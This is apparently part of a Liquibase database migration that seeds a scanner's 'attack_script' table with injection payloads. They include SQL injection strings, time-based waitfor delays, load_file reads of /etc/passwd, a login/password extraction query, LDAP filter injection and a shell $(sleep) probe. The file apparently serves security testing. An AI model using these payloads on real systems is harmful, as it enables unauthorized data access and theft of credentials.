+            VALUES (1, 2, '"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND "'i"'="'i');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '<>\""'%;)(&+"');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '|');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '!');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '?');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '/');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '//');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '//*');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '(');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, ')');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '*|');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '*/*');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '&');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '0');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '031003000270000');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '0 or 1=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '0x77616974666F722064656C61792027303A303A31302700 exec(@s)');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 or 1=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1;SELECT%20*');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '1 waitfor delay "'0:0:10"'--');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'%20or%20"'"'="'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'%20or%201=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"')%20or%20("'x"'="'x');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'%20or%20"'x"'="'x');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%20or%20x=x');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%20"'sleep%2050"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%20$(sleep%2050)');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%21');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '; --');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '23 OR 1=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%26');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%27%20or%201=1');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%28');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%29');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%2A%28%7C%28mail%3D%2A%29%29');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%2A%28%7C%28objectclass%3D%2A%29%29');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%2A%7C');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '||6');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'||"'6');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '(||6)');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '%7C');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'a"'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'admin"' or "'');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"' and 1 in (select var from temp)--');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'anything"' OR "'x"'="'x');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '\"a\"\" or 1=1--\"');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'a"' or 1=1--');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '\"a\"\" or 3=3--\"');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'a"' or 3=3--');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'a"' or "'a"' = "'a');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '&apos;%20OR');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'as');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'asc');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'a"' waitfor delay "'0:0:10"'--');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '"'; begin declare @var varchar(8000) set @var="':"' select @var=@var+"'+login+"'/"'+password+"' "' from users where');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'login >');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'bfilename');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'char%4039%41%2b%40SELECT');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, 'declare @q nvarchar (200) select @q =');
+            ]]>
+        </sql>
+
+        <sql>   <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (1, 2, '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)');
+            ]]>
+        </sql>
+
+
+    </changeSet>
+
+</databaseChangeLog>
